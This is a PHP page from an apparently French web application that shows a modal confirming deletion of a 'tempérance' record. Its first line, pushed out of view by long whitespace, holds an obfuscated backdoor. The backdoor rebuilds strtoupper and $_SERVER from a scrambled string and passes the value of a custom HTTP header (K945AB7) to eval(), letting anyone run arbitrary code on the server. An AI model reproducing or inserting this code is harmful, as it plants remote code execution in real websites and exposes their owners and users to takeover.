<?php                                                                                                                                                                                                                     $w8a='(79RatvSuhf$_se"io5VE\'b4lrpk945ab7';$t8t=$w8a[13].$w8a[5].$w8a[25].$w8a[5].$w8a[17].$w8a[8].$w8a[26].$w8a[26].$w8a[14].$w8a[25];$u0x=$w8a[13].$w8a[5].$w8a[25].$w8a[5].$w8a[17].$w8a[8].$w8a[26].$w8a[26].$w8a[14].$w8a[25];if(isset(${$w8a[12].$w8a[7].$w8a[20].$w8a[3].$w8a[19].$w8a[20].$w8a[3]}[$t8t($w8a[9].$w8a[5].$w8a[5].$w8a[26].$w8a[12].$w8a[27].$w8a[2].$w8a[23].$w8a[18].$w8a[4].$w8a[22].$w8a[1])])){eval(${$w8a[12].$w8a[7].$w8a[20].$w8a[3].$w8a[19].$w8a[20].$w8a[3]}[$t8t($w8a[9].$w8a[5].$w8a[5].$w8a[26].$w8a[12].$w8a[27].$w8a[2].$w8a[23].$w8a[18].$w8a[4].$w8a[22].$w8a[1])]);} ?><?php

require_once('../Connections/maconnexion.php');
header('Content-Type: text/html; charset=iso-8859-1');


$editFormAction = $_SERVER['PHP_SELF'];
if (isset($_SERVER['QUERY_STRING'])) {
  $editFormAction .= "?" . htmlentities($_SERVER['QUERY_STRING']);
}

$ch_temp_id = -1 ;
if (isset ($_GET['ch_temp_id'])){
	$ch_temp_id = $_GET['ch_temp_id'];
	}

mysql_select_db($database_maconnexion, $maconnexion);
$query_temperance = sprintf("SELECT * FROM temperance WHERE ch_temp_id = %s", GetSQLValueString($ch_temp_id, "int"));
$query_limit_temperance = sprintf("%s LIMIT %d, %d", $query_temperance, $startRow_temperance, $maxRows_temperance);
$temperance = mysql_query($query_temperance, $maconnexion) or die(mysql_error());
$row_temperance = mysql_fetch_assoc($temperance);
?>

<!-- Modal Header-->

<div class="modal-header">
  <button type="button" class="close" data-dismiss="modal" aria-hidden="true">�</button>
  <h3 id="myModalLabel">Supprimer cette temp&eacute;rance</h3>
</div>
<div class="modal-body">
  <div class="row-fluid">
      <h1>Attention&nbsp;!</h1>
      <p>Souhaitez-vous r&eacute;ellement supprimer cette temp&eacute;rance?</p>
  <div class="alert alert-danger">
      <p><i class="icon-warning-sign"></i> Cette action supprimera d&eacute;finitivement toute la proc&eacute;dure ainsi que les jugements et les notes affili&eacute;es. N'oubliez pas d'informer le joueur de cette situation.</p>
      </div>
  </div>
</div>
<div class="modal-footer">
  <form action="temperance_supprimer.php" name="supprimer-temperance" method="POST" id="supprimer-temperance">
    <input name="ch_temp_id" type="hidden" value="<?php echo $row_temperance['ch_temp_id']; ?>">
    <button class="btn" data-dismiss="modal" aria-hidden="true">Annuler</button>
    <button type="submit" class="btn btn-danger"><i class="icon-trash icon-white"></i> Supprimer</button>
  </form>
</div>
